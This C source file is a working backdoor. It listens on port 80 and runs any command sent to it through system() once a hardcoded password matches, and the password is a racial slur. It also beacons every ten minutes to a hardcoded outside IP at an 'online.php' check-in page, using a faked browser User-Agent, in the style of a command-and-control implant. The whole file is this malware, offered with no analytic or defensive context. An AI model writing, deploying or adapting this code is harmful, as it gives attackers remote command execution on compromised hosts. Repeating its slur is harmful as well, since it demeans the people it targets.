#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <strings.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#define PASSWORD "niggerdick"

void *fnParseData(void *arg);

void *fnPingPong(void *arg)
{
	char szRecvBuff[1024];
	char packet[1024];
	char ip[] = "37.221.170.5"; // "37.221.170.5";

	snprintf(packet, sizeof(packet) - 1, "GET /~dqyefldi/online.php HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-cache\r\nOrigin: http://google.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n", ip);

	struct sockaddr_in *remote;
	int sock;
	int tmpres;
	
	
	while (1)
	{
		if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		{
			sleep(600);
			continue;
		}
		
		remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
		remote->sin_family = AF_INET;
		tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
		
		if (tmpres < 0)  
		{
			sleep(600);
			continue;
		}
		else if (tmpres == 0)
		{
			continue;
			sleep(600);
		}
		
		remote->sin_port = htons(80);
		
		if (connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0)
		{
			continue;
		}
			
		tmpres = send(sock, packet, strlen(packet), 0);
		
		/*
		int i = 1;
		int dwTotal = 0;

		
		while (1)
		{
			i = recv(sock, szRecvBuff + dwTotal, sizeof(szRecvBuff) - dwTotal, 0);
			//printf("Received %d bytes\n", i);
			if (i <= 0)
				break;
				
			dwTotal += i;
		}

		szRecvBuff[dwTotal] = '\0';
		

		printf("Received -> \n%s\n\n", szRecvBuff);
		*/

		close(sock);
		
		sleep(600);
	}
	
	return 0;
}

int main(int argc, char**argv)
{
	int sListen, sConn, n;
	int x = 0;
	struct sockaddr_in servaddr, clientAddr;
	socklen_t sClient;
	pid_t childpid;
	char szMessage[1000];
	pthread_t pThreads[10240];
	int rc, pp;
	
	sListen=socket(AF_INET, SOCK_STREAM,0);

	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr=htonl(INADDR_ANY);
	servaddr.sin_port=htons(80);

	bind(sListen, (struct sockaddr *)&servaddr, sizeof(servaddr));

	listen(sListen, 1024);


	printf("Listening for connection on port %d\n", ntohs(servaddr.sin_port));

	pthread_t pingpong[1];
	pp = pthread_create(&pingpong[0], NULL, fnPingPong, NULL);

	for(;;)
	{
		sClient = sizeof(clientAddr);
		sConn = accept(sListen, (struct sockaddr *)&clientAddr, &sClient);

		if ((childpid = fork()) == 0)
		{
			close (sListen);

			for(;;)
			{
				n = recvfrom(sConn, szMessage, 1000, 0, (struct sockaddr *)&clientAddr, &sClient);
				sendto(sConn, szMessage, n, 0, (struct sockaddr *)&clientAddr, sizeof(clientAddr));
				szMessage[n] = 0;
				printf("Received -> %s\n", szMessage);
				rc = pthread_create(&pThreads[x], NULL, fnParseData, (void *)szMessage);
				usleep(100000);
				bzero(szMessage, sizeof(szMessage));
				x++;
			}

		}

		close(sConn);
	}
}

void *fnParseData(void *arg)
{

	char *szMessage = (char*)arg;
	
	printf("Parsing %s\n", szMessage);
	
	int iSize = strlen(szMessage) - strlen(strstr(szMessage, "|"));
	char szCmd[128];
	strncpy(szCmd, szMessage, iSize);

	szCmd[iSize] = '\0';	
	printf("Command Received -> %s\n", szCmd);
	
	if (strstr(szMessage + iSize + 1, PASSWORD))
	{
		system(szCmd);
	}
	
	return 0;
}
